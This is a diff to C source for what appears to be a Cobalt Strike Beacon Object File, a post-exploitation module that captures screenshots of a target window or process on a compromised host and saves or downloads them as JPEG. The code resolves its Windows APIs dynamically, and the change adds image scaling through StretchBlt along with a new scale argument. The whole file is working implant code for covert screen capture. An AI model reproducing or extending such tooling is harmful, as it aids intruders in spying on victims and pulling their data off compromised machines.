@@ -123,8 +123,10 @@ typedef HBITMAP(WINAPI* PFN_CreateCompatibleBitmap)(HDC, int, int);
 typedef HGDIOBJ(WINAPI* PFN_SelectObject)(HDC, HGDIOBJ);
 typedef BOOL(WINAPI* PFN_PrintWindow)(HWND, HDC, UINT);
 typedef BOOL(WINAPI* PFN_BitBlt)(HDC, int, int, int, int, HDC, int, int, DWORD);
+typedef BOOL(WINAPI* PFN_StretchBlt)(HDC, int, int, int, int, HDC, int, int, int, int, DWORD);
 typedef BOOL(WINAPI* PFN_ShowWindow)(HWND, int);
 typedef LONG(WINAPI* PFN_SetWindowLongA)(HWND, int, LONG);
+typedef int (WINAPI* PFN_SetStretchBltMode)(HDC, int);
 typedef BOOL(WINAPI* PFN_SetLayeredWindowAttributes)(HWND, COLORREF, BYTE, DWORD);
 typedef BOOL(WINAPI* PFN_UpdateWindow)(HWND);
 typedef VOID(WINAPI* PFN_Sleep)(DWORD);
@@ -164,8 +166,10 @@ static PFN_CreateCompatibleBitmap pCreateCompatibleBitmap = NULL;
 static PFN_SelectObject           pSelectObject = NULL;
 static PFN_PrintWindow            pPrintWindow = NULL;
 static PFN_BitBlt                 pBitBlt = NULL;
+static PFN_StretchBlt             pStretchBlt = NULL;
 static PFN_ShowWindow             pShowWindow = NULL;
 static PFN_SetWindowLongA         pSetWindowLongA = NULL;
+static PFN_SetStretchBltMode      pSetStretchBltMode = NULL;
 static PFN_SetLayeredWindowAttributes pSetLayeredWindowAttributes = NULL;
 static PFN_UpdateWindow           pUpdateWindow = NULL;
 static PFN_Sleep                  pSleep = NULL;
@@ -212,8 +216,10 @@ void ResolveAPIs(void)
     pSelectObject = (PFN_SelectObject)GetProcAddress(hGdi32, "SelectObject");
     pPrintWindow = (PFN_PrintWindow)GetProcAddress(hUser32, "PrintWindow");
     pBitBlt = (PFN_BitBlt)GetProcAddress(hGdi32, "BitBlt");
+    pStretchBlt = (PFN_StretchBlt)GetProcAddress(hGdi32, "StretchBlt");
     pShowWindow = (PFN_ShowWindow)GetProcAddress(hUser32, "ShowWindow");
     pSetWindowLongA = (PFN_SetWindowLongA)GetProcAddress(hUser32, "SetWindowLongA");
+    pSetStretchBltMode = (PFN_SetStretchBltMode)GetProcAddress(hGdi32, "SetStretchBltMode");
     pSetLayeredWindowAttributes = (PFN_SetLayeredWindowAttributes)GetProcAddress(hUser32, "SetLayeredWindowAttributes");
     pUpdateWindow = (PFN_UpdateWindow)GetProcAddress(hUser32, "UpdateWindow");
     pSleep = (PFN_Sleep)GetProcAddress(hKernel32, "Sleep");
@@ -531,18 +537,56 @@ BOOL BitmapToJpeg(HBITMAP hBitmap, int quality, int grayscale, BYTE** pJpegData,
 //-------------------------------------------------------------
 // Save (or download) the given HBITMAP as a JPEG file with the provided filename
 //-------------------------------------------------------------
-BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName, int savemethod, int grayscale, int quality)
+BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName, int savemethod, int grayscale, int quality, int scale)
 {
     ResolveAPIs();
 
     BYTE* jpegData = NULL;
     DWORD jpegSize = 0;
+    HBITMAP hWork = hBitmap;
+    HBITMAP hScaled = NULL;
+
+#ifndef HALFTONE
+#define HALFTONE 4
+#endif
+
+    if (scale > 0 && scale != 100 && pGetObjectA && pCreateCompatibleDC && pCreateCompatibleBitmap &&
+        pSelectObject && pStretchBlt && pSetStretchBltMode && pGetDC && pReleaseDC) {
+        BITMAP bm = { 0 };
+        if (pGetObjectA(hBitmap, sizeof(BITMAP), &bm)) {
+            int newW = (bm.bmWidth * scale) / 100;
+            int newH = (bm.bmHeight * scale) / 100;
+            if (newW > 0 && newH > 0) {
+                HDC hScreen = pGetDC(NULL);
+                HDC hSrcDC = pCreateCompatibleDC(hScreen);
+                HDC hDstDC = pCreateCompatibleDC(hScreen);
+                HGDIOBJ oldSrc = pSelectObject(hSrcDC, hBitmap);
+                hScaled = pCreateCompatibleBitmap(hScreen, newW, newH);
+                if (hScaled) {
+                    HGDIOBJ oldDst = pSelectObject(hDstDC, hScaled);
+                    pSetStretchBltMode(hDstDC, HALFTONE);
+                    if (pStretchBlt(hDstDC, 0, 0, newW, newH, hSrcDC, 0, 0, bm.bmWidth, bm.bmHeight, SRCCOPY)) {
+                        hWork = hScaled;
+                    }
+                    pSelectObject(hDstDC, oldDst);
+                }
+                pSelectObject(hSrcDC, oldSrc);
+                pDeleteDC(hSrcDC);
+                pDeleteDC(hDstDC);
+                pReleaseDC(NULL, hScreen);
+            }
+        }
+    }
 
 
-    if (!BitmapToJpeg(hBitmap, quality, grayscale, &jpegData, &jpegSize)) {
+    if (!BitmapToJpeg(hWork, quality, grayscale, &jpegData, &jpegSize)) {
         BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to convert bitmap to JPEG");
+        if (hScaled)
+            pDeleteObject(hScaled);
         return FALSE;
     }
+    if (hScaled)
+        pDeleteObject(hScaled);
 
     if (savemethod == 0) {
         BeaconPrintf(CALLBACK_OUTPUT, "Saving JPEG to disk with filename %s", lpszFileName);
@@ -772,11 +816,14 @@ void go(char* buff, int len)
     int pid = BeaconDataInt(&parser);
     int grayscale = BeaconDataInt(&parser);
     int quality = BeaconDataInt(&parser);
+    int scale = BeaconDataInt(&parser);
     if (quality < 0) quality = 0;
     if (quality > 100) quality = 100;
+    if (scale < 1) scale = 100;
+    if (scale > 1000) scale = 1000; // cap to prevent huge allocations
 
     if (debug)
-        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] go() called with filename: %s, savemethod: %d, pid: %d, grayscale: %d, quality: %d, debug: %d", filename, savemethod, pid, grayscale, quality, debug);
+        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] go() called with filename: %s, savemethod: %d, pid: %d, grayscale: %d, quality: %d, scale: %d, debug: %d", filename, savemethod, pid, grayscale, quality, scale, debug);
     
     BOOL dpi = SetProcessDPIAware(); // Set DPI awareness to fix incomplete screenshots
     
@@ -874,7 +921,7 @@ void go(char* buff, int len)
     if (hBitmap) {
         if (debug)
             BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Captured bitmap successfully; saving/downloading as %s", filename);
-        if (!SaveHBITMAPToFile(hBitmap, filename, savemethod, grayscale, quality))
+        if (!SaveHBITMAPToFile(hBitmap, filename, savemethod, grayscale, quality, scale))
             BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to save JPEG");
         else
             BeaconPrintf(CALLBACK_OUTPUT, "Screenshot saved/downloaded successfully", filename);
